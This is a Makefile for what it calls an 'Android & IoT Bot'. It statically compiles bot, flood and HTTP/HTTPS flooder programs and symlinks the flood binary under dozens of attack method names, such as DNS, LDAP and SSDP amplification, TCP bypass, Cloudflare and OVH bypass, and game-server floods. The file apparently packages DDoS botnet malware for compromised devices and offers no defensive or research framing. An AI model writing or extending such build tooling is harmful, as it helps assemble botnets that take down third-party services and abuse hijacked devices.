# Makefile for Android & IoT Bot Compilation
CXX ?= g++
CXXFLAGS = -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -pthread

METHODS = dns udp ldap ssdp home udpbypass tcp socket ovh tcpmix tcpbypass ack \
          game rainbow rocket roblox fivem pubg fortnite warthunder counter samp \
          subnet icmp httpx rapidflood tls tlsx bypass browser cache cloudflare

all: bot flood http https symlinks

bot: ../bot.cpp
	$(CXX) $(CXXFLAGS) -static -o bot ../bot.cpp

http: ../http.cpp
	$(CXX) $(CXXFLAGS) -static -o http ../http.cpp

https: ../https.cpp
	$(CXX) $(CXXFLAGS) -o https ../https.cpp -lssl -lcrypto

flood: ../flood.cpp
	$(CXX) $(CXXFLAGS) -o flood ../flood.cpp -lssl -lcrypto

# Lightweight IoT build without OpenSSL dependency
iot-nossl: ../bot.cpp ../flood.cpp ../http.cpp
	$(CXX) $(CXXFLAGS) -static -o bot ../bot.cpp
	$(CXX) $(CXXFLAGS) -static -o http ../http.cpp
	$(CXX) $(CXXFLAGS) -DNO_SSL -static -o flood ../flood.cpp
	@for m in $(METHODS); do \
		ln -sf flood $$m; \
	done

symlinks: flood
	@for m in $(METHODS); do \
		ln -sf flood $$m; \
	done

clean:
	rm -f bot http https flood $(METHODS)
